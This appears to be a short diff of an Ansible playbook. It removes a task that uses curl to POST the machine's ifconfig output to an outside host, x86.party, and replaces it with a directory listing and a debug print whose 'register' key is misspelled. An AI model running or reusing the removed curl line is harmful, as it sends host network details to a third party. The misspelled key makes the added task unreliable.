@@ -4,4 +4,8 @@
  
   tasks:
   - name: Connect out to x86.party.
-    shell: curl -d -k "$(ifconfig)" -X POST https://sendmedataplease.x86.party
+    shell: ls -la /
+    resgister: shell
+
+  - name: Print output.
+    debug: msg={{ shell.stdout }}
